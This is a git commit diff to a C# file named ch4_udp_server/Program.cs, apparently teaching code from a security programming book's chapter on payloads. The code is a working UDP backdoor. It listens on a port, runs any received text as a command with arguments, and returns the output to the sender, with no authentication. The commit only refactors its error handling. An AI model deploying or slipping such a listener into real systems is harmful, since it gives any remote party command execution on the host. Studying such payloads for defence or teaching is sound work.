d58507d960a02240d57e25eb3731df251015f174
Brandon Perry <bperry.volatile@gmail.com>
2015-05-06 19:36:10 -0500

    small code modifications to the UDP payload

--- ch4_udp_server/Program.cs
+++ ch4_udp_server/Program.cs
@@ -9,26 +9,32 @@ namespace ch4_udp_server
 {
 	class MainClass
 	{
-		public static void Main(string[] args)
+		public static void Main (string[] args)
 		{
-			int lport = int.Parse(args[0]);
+			int lport = int.Parse (args [0]);
 			using (UdpClient listener = new UdpClient (lport)) {
 				IPEndPoint localEP = new IPEndPoint (IPAddress.Any, lport);
 				string cmd;
 				byte[] input;
 
-				try {
-					while (true) {
-						input = listener.Receive (ref localEP);
-						cmd = Encoding.ASCII.GetString (input, 0, input.Length);
+				while (true) {
+					input = listener.Receive (ref localEP);
+					cmd = Encoding.ASCII.GetString (input, 0, input.Length);
 
-						if (cmd == string.Empty)
-							break;
+					if (string.IsNullOrEmpty (cmd)) {
+						listener.Close ();
+						return;
+					}
 
-						string[] split = cmd.Trim().Split(' ');
-						string filename = split.First();
-						string arg = string.Join(" ", split.Skip(1));
+					if (string.IsNullOrWhiteSpace (cmd))
+						continue;
 
+					string[] split = cmd.Trim ().Split (' ');
+					string filename = split.First ();
+					string arg = string.Join (" ", split.Skip (1));
+					string results = string.Empty;
+
+					try {
 						Process prc = new Process ();
 						prc.StartInfo = new ProcessStartInfo ();
 						prc.StartInfo.FileName = filename;
@@ -38,20 +44,21 @@ namespace ch4_udp_server
 						prc.Start ();
 						prc.WaitForExit ();
 
-						using (Socket sock = new Socket (AddressFamily.InterNetwork, SocketType.Dgram,
-							ProtocolType.Udp)) {
-
-							IPAddress sender = localEP.Address;
-							IPEndPoint remoteEP = new IPEndPoint (sender, lport);
-
-							byte[] results = Encoding.ASCII.GetBytes (prc.StandardOutput.ReadToEnd ());
-							sock.SendTo (results, remoteEP);
-						}
+						results = prc.StandardOutput.ReadToEnd ();
+					} catch {
+						results = "There was an error running the command: " + filename;
 					}
-				} catch (Exception e) {
-					Console.WriteLine (e.ToString ());
+
+					using (Socket sock = new Socket (AddressFamily.InterNetwork, SocketType.Dgram,
+						ProtocolType.Udp)) {
+
+						IPAddress sender = localEP.Address;
+						IPEndPoint remoteEP = new IPEndPoint (sender, lport);
+
+						byte[] resultsBytes = Encoding.ASCII.GetBytes (results);
+						sock.SendTo (resultsBytes, remoteEP);
+					}
 				}
-				listener.Close ();
 			}
 		}
 	}
